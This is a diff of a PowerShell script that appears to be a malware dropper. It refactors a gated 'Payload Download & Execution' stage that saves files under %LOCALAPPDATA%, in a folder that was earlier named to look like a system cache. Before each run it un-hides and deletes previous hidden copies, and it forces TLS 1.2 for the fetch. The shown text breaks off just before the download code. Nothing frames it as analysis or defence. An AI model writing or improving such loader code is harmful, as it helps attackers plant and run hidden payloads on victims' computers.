@@ -16,6 +16,11 @@ param (
     [switch]$Wait
 )
 
+# Resolve target paths dynamically using parameters
+$basePath        = $env:LOCALAPPDATA
+$targetDirectory = Join-Path -Path $basePath -ChildPath $FolderName
+$destinationPath = Join-Path -Path $targetDirectory -ChildPath $FileName
+
 # -------------------------------------------------------------------------
 # Step 0: Two-Step Verification (Email OTP)
 # -------------------------------------------------------------------------
@@ -91,29 +96,28 @@ catch {
     Write-Error "Authentication Error: $($_.Exception.Message)"
     exit 1
 }
+
 # -------------------------------------------------------------------------
-# Step -1: Immediate Pre-execution Cleanup
+# Step 1: Pre-Execution Cleanup
 # -------------------------------------------------------------------------
 
-$cleanupPath = "$env:LOCALAPPDATA\SystemCache\main.bat"
 try {
-    if (Test-Path -LiteralPath $cleanupPath) {
-        attrib -h "$cleanupPath" 2>$null
-        Remove-Item -LiteralPath "$cleanupPath" -Force -ErrorAction SilentlyContinue
+    if (Test-Path -LiteralPath $destinationPath) {
+        Write-Host "Cleaning up previous instance of $FileName..." -ForegroundColor Cyan
+        attrib -h "$destinationPath" 2>$null
+        Remove-Item -LiteralPath "$destinationPath" -Force -ErrorAction Stop
+        Write-Host "Previous instance removed successfully." -ForegroundColor Green
     }
 }
 catch {
-    # Ignore errors if the file doesn't exist or is locked
+    Write-Warning "Cleanup warning: $($_.Exception.Message)"
 }
+
 # -------------------------------------------------------------------------
-# Step 1: Payload Download & Execution (Runs only if verified)
+# Step 2: Payload Download & Execution
 # -------------------------------------------------------------------------
 
 [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
-
-$basePath        = $env:LOCALAPPDATA
-$targetDirectory = Join-Path -Path $basePath -ChildPath $FolderName
-$destinationPath = Join-Path -Path $targetDirectory -ChildPath $FileName
 
 try {
     if (-not (Test-Path -LiteralPath $targetDirectory)) {
